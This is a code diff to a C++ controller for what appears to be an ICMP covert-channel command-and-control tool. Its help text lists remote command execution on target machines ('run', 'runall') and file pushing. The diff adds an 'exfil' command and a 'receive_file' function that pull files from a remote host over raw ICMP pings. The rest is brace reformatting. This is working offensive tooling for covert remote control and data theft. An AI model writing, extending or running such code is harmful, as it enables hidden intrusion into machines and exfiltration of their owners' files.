@@ -235,7 +235,8 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
 
   FILE *fp = fopen(src_file.c_str(), "rb");
   uint8_t out[512];
-  if (fp == NULL) {
+  if (fp == NULL)
+  {
     perror("fopen");
     return;
   }
@@ -248,6 +249,48 @@ void send_file(const std::string &dst, const std::string &src_file, const std::s
   } while (nbytes != 0);
 
   send_ping(sockfd, dst, NULL, 0);
+}
+
+void receive_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
+{
+  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (sockfd == -1)
+  {
+    perror("socket");
+    exit(-1);
+  }
+
+  std::string cmd = "exfil ";
+  cmd.append(src_file);
+
+  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);
+
+  FILE *fp = fopen(dst_file.c_str(), "wb+");
+  if (fp == NULL)
+  {
+    perror("fopen");
+    return;
+  }
+
+  while (1)
+  {
+    uint8_t in[512];
+    std::string src_ip;
+    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
+
+    if (dst != src_ip)
+      continue;
+
+    if (num_bytes > 0)
+    {
+      fwrite(in, 1, num_bytes, fp);
+    }
+    else
+    {
+      fclose(fp);
+      break;
+    }
+  }
 }
 
 void ping(const std::string &dst)
@@ -276,11 +319,14 @@ void export_connections(const std::string &filename)
   }
 }
 
-void load_connections(const std::string &filename) {
+void load_connections(const std::string &filename)
+{
   std::ifstream file(filename);
-  if (file.is_open()) {
+  if (file.is_open())
+  {
     std::string host, ip;
-    while (file >> host >> ip) {
+    while (file >> host >> ip)
+    {
       hosts[host] = ip;
     }
     file.close();
@@ -301,6 +347,7 @@ void help()
   std::puts("\trun [host] [command]: run a command on a target machine");
   std::puts("\trunall [command]: runs command on all machines");
   std::puts("\tfile [host] [src] [dst]: send a file over to host machine");
+  std::puts("\texfil [host] [src] [dst]: receive a file from the host machine");
   std::puts("\texport [filename]: exports currently connected hosts to file");
   std::puts("\tload [filename]: loads file to hosts list");
   std::puts("\tclear: clears currently connected list");
@@ -309,7 +356,8 @@ void help()
 
 int main(int argc, char **argv)
 {
-  if (argc > 1) {
+  if (argc > 1)
+  {
     load_connections(argv[1]);
   }
 
@@ -329,7 +377,8 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("start") == 0)
     {
-      if (listening) {
+      if (listening)
+      {
         std::puts("Already listening!");
         continue;
       }
@@ -442,7 +491,7 @@ int main(int argc, char **argv)
         send_command(it->second, command);
       }
     }
-    else if (input_arr.at(0).compare("file") == 0) 
+    else if (input_arr.at(0).compare("file") == 0)
     {
       if (input_arr.size() < 4)
       {
@@ -455,6 +504,20 @@ int main(int argc, char **argv)
                 << ip
                 << "\n";
       send_file(ip, input_arr.at(2), input_arr.at(3));
+    }
+    else if (input_arr.at(0).compare("exfil") == 0)
+    {
+      if (input_arr.size() < 4)
+      {
+        std::puts("usage: exfil [host] [src] [dst]");
+        continue;
+      }
+      std::string ip = active_connections[input_arr.at(1)];
+
+      std::cout << "Receiving file: " << input_arr.at(2) << " to: " << input_arr.at(3) << " on: "
+                << ip
+                << "\n";
+      receive_file(ip, input_arr.at(2), input_arr.at(3));
     }
     else if (input_arr.at(0).compare("export") == 0)
     {
@@ -472,14 +535,15 @@ int main(int argc, char **argv)
     }
     else if (input_arr.at(0).compare("load") == 0)
     {
-      if(input_arr.size() < 2) {
+      if (input_arr.size() < 2)
+      {
         std::puts("usage: load [filename]");
         continue;
       }
       std::cout << "Loading from: " << input_arr.at(1) << "\n";
       load_connections(input_arr.at(1));
     }
-    else if (input_arr.at(0).compare("clear") == 0) 
+    else if (input_arr.at(0).compare("clear") == 0)
     {
       std::puts("Clearing active connections");
       std::lock_guard<std::mutex> guard(active_connections_mutex);
